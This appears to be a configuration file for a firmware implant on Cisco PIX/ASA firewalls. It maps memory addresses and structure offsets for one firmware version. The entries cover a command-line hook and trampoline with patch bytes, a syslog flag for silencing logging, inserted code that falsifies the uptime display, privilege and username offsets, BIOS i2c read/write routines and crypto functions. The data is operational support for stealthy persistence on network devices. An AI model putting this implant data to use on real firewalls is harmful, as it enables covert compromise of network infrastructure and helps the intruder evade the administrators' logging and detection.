; --- SECTION I ---
;
0x10072100            // pix version
0x7ce800              // address of implant configuration
FlashDirlistAddress 0x004d2828      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x004d1de8      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004d2b58      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x004d2c88     // ifs_rename; move a file
FlashGetFileInfoAddress 0x004d3258  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x004d4258     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000014  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x0101e778    // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x0139a740   // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x00115ea0      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to ioctl function in device table
CIStartFunc         0x0015c5a0      // addr of the command interface start function -- telnet function
CommandListAddr     0x01191db8      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x01296818      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x0102a888      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x01431258      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0xb0            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0xb4            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0xbc            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x000009f8      // offset into the syslog structure where the logging level is stored
Open                0x00115fb0      // open
WatchDogTimeout     0x010a0ef0      // Address where the thread timeout value is stored 
UpTimeCounter       0x0136f640      // Address of the up time counter
Display_uptime_addr 0x00164cc0      // Address of the function that display the uptime
Inserted_code_addr  0x00177c02      // Address of the our insterted function to add time to the uptime
i2cReadByte         0x0102eab8      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte        0x0102ec68      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress      0x0015ca5f      // Address of hook into the command interface
AvailMemoryPtr      0x01370400      // Address of total available memory
;
srand               0x010265f8
BN_new              0x00f6cda0
BN_free             0x00f6cd00
BN_mod_exp          0x00fa5d30
BN_CTX_new          0x00f6e230
BN_CTX_free         0x00f6e2b0
BN_bin2bn           0x00f6d430
BN_bn2bin           0x00f6d550
BN_bn2hex           0x00fb27a0
BN_num_bits         0x00f6cc00
DH_p                0x010b5910
aesEncrypt          0x0017fec0
aesKeySet           0x0017c440
slimHookAddr        0x004a80e7
slimTrampoline      0x005b9269
HookByte1           0x8b
HookBytes2to5       0xc101304b
codepageBase        0x0136fe80
codeSectionStart    0x00100000
codeSectionEnd      0x0109fc20
;
; --- END OF SECTION II ---
;
:EOS:
;
